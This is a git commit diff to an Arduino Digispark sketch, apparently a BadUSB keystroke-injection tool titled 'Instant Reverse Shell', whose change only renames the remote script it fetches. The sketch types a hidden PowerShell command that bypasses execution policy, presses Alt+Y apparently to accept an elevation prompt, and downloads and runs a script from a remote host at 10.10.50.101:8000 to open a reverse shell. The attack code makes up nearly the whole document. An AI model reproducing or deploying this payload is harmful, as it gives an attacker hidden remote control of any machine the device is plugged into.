969cb3a7ceb170aa22f35c490432382d84664841
Samuel T <68336568+Samuel20354@users.noreply.github.com>
2021-08-13 11:07:49 +0100

    Update reverse_shell.ino

--- Instant Reverse Shell (PS)/reverse_shell/reverse_shell.ino
+++ Instant Reverse Shell (PS)/reverse_shell/reverse_shell.ino
@@ -13,7 +13,7 @@ void loop() {
   DigiKeyboard.delay(4000);
   DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
   DigiKeyboard.delay(1200);
-  DigiKeyboard.print("powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('http://10.10.50.101:8000/reverse.ps1'); reverse.ps1"");
+  DigiKeyboard.print("powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('http://10.10.50.101:8000/script.ps1'); script.ps1"");
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(9000);
   DigiKeyboard.print("exit");
